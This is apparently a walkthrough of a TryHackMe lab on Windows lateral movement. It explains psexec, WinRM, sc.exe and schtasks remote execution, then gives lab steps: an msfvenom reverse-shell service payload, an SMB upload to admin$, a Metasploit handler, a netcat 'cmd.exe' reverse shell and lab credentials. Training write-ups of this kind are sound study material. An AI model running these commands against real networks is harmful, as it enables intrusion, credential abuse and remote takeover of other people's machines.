![image](https://github.com/user-attachments/assets/1391962a-d763-4261-9809-b61707c31bc1)


# Lateral Movement and Pivoting
   Learn about common techniques used to move laterally across a Windows network.
   

TryHackMe room [link](https://tryhackme.com/room/lateralmovementandpivoting)

<br>

## Task 1 : Introduction

> Key Objectives

- Learn **lateral movement techniques** used by attackers to navigate networks stealthily.
- Use stolen **credentials/authentication** material to move between systems.
- **Pivot** through compromised hosts to access restricted segments.




> Network Setup Guide


![image](https://github.com/user-attachments/assets/45d018bf-624d-4239-87a9-8945586aa440)


1. DNS Configuration (Critical for AD)

   > Attack Machine:

        sed -i '1s|^|nameserver 10.200.124.101\n|' /etc/resolv-dnsmasq
   
      And to verify the connection run..

       nslookup thmdc.za.tryhackme.com
   
     Set DNS to THMDC’s IP in Network Manager.


3. VPN Connection (For Personal Machines)

       sudo openvpn user-lateralmovementandpivoting.ovpn

Verify connection on the access page (green tick).

3. Note Your Attacker IP

        ifconfig                   

We will be using this IP for reverse shells/payloads..




> Initial Access

**1. Get Credentials:**

   For getting the credentials we need to visit:
   

        http://distributor.za.tryhackme.com/creds

   
   The we need to click `Get Credentials`. and we will get the 	`<AD_Username> ` and 	`password`..

![image](https://github.com/user-attachments/assets/28a5e123-f747-4f5b-b32d-7a5e178f7015)


**2. SSH into Jump Host (THMJMP2):**


        ssh za\\danny.goddard@thmjmp2.za.tryhackme.com

   
This simulates a breached foothold.

![image](https://github.com/user-attachments/assets/f9edbc1f-a72e-4813-80ac-a631f76e9e32)





<br>


## Task 2 : Moving Through the Network

![image](https://github.com/user-attachments/assets/8e7a6c99-01e0-4620-9ce3-dd8e36a7bd69)

> What is Lateral Movement?

- **Definition:** Techniques attackers use to navigate a network after initial compromise.
- **Purpose:**
   - Bypass network restrictions (e.g., `firewalls`).
   - Access high-value targets (e.g., `databases`, `code repos`).
   - Establish persistence and evade detection.



> The Lateral Movement Cycle

- Compromise a host (e.g., via phishing).
- Elevate privileges (e.g., local admin → domain admin).
- Extract credentials (hashes, tickets, tokens).
- Repeat to move to new hosts.

![image](https://github.com/user-attachments/assets/25647e25-2ef9-46d6-8077-9477f92bf853)




> Common Lateral Movement Methods

- Standard Protocols (Visible but blends in):
   - RDP/WinRM/SSH: Mimic normal user behavior.
   - Caution: Avoid illogical connections (e.g., local admin from Marketing to DEV-PC).
     
- Stealthier Techniques (Harder to detect):
   - Pass-the-Hash, Overpass-the-Hash.
   - Token impersonation, Kerberos attacks.




> Example..

![image](https://github.com/user-attachments/assets/c0514de9-5017-480b-9841-6d88ba117db2)





> UAC & Administrator Accounts

- Local Admins:
   - Restricted by UAC (except default Administrator account).
   - Cannot perform remote admin tasks via RPC/SMB/WinRM (only via RDP).
- Domain Admins:
   - Full privileges remotely (no UAC restrictions).
- Workaround: Disable UAC (if possible) or use domain accounts.



<br>


## Task 3 : Spawning Processes Remotely

  This task will look at the available methods an attacker has to spawn a process remotely, 
allowing them to run commands on machines where they have valid credentials. Each of 
the techniques discussed uses slightly different ways to achieve the same purpose, and some 
of them might be a better fit for some specific scenarios.

###  1. Psexec
- **Port:** TCP 445 (`SMB`)
- **Group:** Administrators
- How it **works?**
      - Connects to `Admin$` share and uploads psexesvc.exe.
      - Creates a remote service (`PSEXESVC`) to run the command.
      - Uses named pipes for `stdin/stdout/stderr`.

**Command:**
      
      psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

      
 `Psexec` is one of many `Sysinternals` Tools and can be downloaded 
[link](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)


![image](https://github.com/user-attachments/assets/e0352dc3-2edc-4871-b06d-489006df255e)



###  2. Windows Remote Management (WinRM)
- **Ports:** TCP 5985 (`HTTP`), 5986 (`HTTPS`)
- **Group:** Remote Management Users
- How it **works**?
        - Uses PowerShell or winrs to execute commands over WinRM.

Command:

      winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

**PowerShell**:
            
      $cred = New-Object System.Management.Automation.PSCredential ("Administrator", (ConvertTo-SecureString "Mypass123" -AsPlainText -Force))

      Enter-PSSession -Computername TARGET -Credential $cred
         
      Invoke-Command -Computername TARGET -Credential $cred -ScriptBlock { whoami }



### 3. Remote Service Creation (sc.exe)
- **Ports:** TCP 135 (`EPM`), 49152–65535 (`DCE`/`RPC` dynamic), 445/139 (`SMB` Named Pipes)
- **Group:** Administrators
- How it works?
      - Creates and starts a service on the target.
      - Executes the given command via service.

Command:
   
      sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
      sc.exe \\TARGET start THMservice
      sc.exe \\TARGET stop THMservice
      sc.exe \\TARGET delete THMservice
      
### 4. Scheduled Task Creation (schtasks)
- **Tool:** `schtasks` (standard on Windows)
- How it **works**?
      - Creates a task set to `run once`.
      - Runs the task manually to trigger the payload.

Command:


      schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE /sd 01/01/1970 /st 00:00
      schtasks /s TARGET /run /TN "THMtask1"
      schtasks /s TARGET /TN "THMtask1" /DELETE /F




<br>

## Let's Get to Lab work!

### 1: Generate the Payload

- On your Attack machine (Kali Linux or anyother), generate the service payload:


      msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=[IP] LPORT=4444 -o myservice.exe
  
> Replace **[IP]** with your Attack machine's IP (you can find this with ip a).

### 2: Upload the Payload
- Upload the payload to `THMIIS` using SMB:


      smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
  
### 3: Set Up Listener
- Start a `Metasploit` listener:

      msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST [IP]; set LPORT 4444;exploit"

### 4: Create Reverse Shell with Admin Creds
- On `THMJMP2` (via your `SSH` session), run:

        runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe [IP] 4443"

When prompted, enter the password: EZpass4ever

### 5: Set Up Netcat Listener
- In a new terminal on your Attacker machine:

      nc -lvp 4443
  
### 6: Create and Start Service
- In the new command prompt you get from the netcat connection (which now has `t1_leonard.summers` token), run:

      sc.exe \\thmiis.za.tryhackme.com create THMservice-[UNIQUE_ID] binPath= "%windir%\myservice.exe" start= auto
      sc.exe \\thmiis.za.tryhackme.com start THMservice-[UNIQUE_ID]
  
Replace `UNIQUE_ID` with a unique number to avoid conflicts.

### 7: Get Shell and Flag
- You can get a shell in your `Metasploit` listener.
- **Navigate** to the desktop: `cd C:\Users\t1_leonard.summers\Desktop`
- Run the **flag**: `flag.exe`

The flag will be displayed

